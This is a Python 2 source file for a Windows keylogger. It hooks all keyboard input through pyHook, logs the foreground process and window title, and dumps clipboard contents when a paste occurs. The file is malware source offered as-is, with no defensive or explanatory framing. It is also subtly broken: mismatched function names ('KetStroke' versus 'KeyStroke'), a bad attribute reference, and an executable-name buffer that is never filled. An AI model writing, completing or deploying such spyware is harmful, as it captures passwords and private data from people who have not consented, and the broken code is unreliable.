from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32  = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    hwnd = user32.GetForegroundWindow()

    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    process_id = "%d" % pid.value

    exe = create_string_buffer("\x00" * 512)

    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title),512)

    print
    print "[ PID: %s - %s - %s]" % (process_id, exe.value, window_.title.value)
    print

    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KetStroke (event):
    global current_window

    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)
    else:
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s " % (pasted_value)
        else:
            print "[PASTE] - %s" % event.Key,
    return True

k1 = pyHook.HookManager()
k1.KeyDown = KeyStroke

k1.HookKeyboard()
pythoncom.PumpMessages()
